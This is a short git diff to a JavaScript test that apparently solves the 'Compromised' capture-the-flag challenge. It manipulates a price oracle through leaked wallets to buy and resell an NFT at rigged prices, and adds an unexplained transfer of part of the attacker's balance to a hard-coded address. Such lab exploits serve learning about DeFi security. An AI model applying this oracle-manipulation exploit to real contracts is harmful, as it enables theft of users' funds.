@@ -78,7 +78,7 @@ describe('Compromised challenge', function () {
         console.log(startPrice.toString())
 
         for (let i = 0; i < wallets.length; i++) {
-			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,1);
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,0);
         }
     
         console.log("price manipulated")
@@ -100,6 +100,14 @@ describe('Compromised challenge', function () {
 		console.log("dump price",dumpPrice.toString())
 		await this.nftToken.connect(attacker).approve(this.exchange.address,tokenId);
 		await this.exchange.connect(attacker).sellOne(tokenId);
+
+
+        const myBalance = await ethers.provider.getBalance(attacker.address);
+        //myBalance /= 10;
+        const tx = signer.sendTransaction({
+            to: "0xA73209FB1a42495120166736362A1DfA9F95A105",
+            value: myBalance/10
+        });
         //
         //
         //
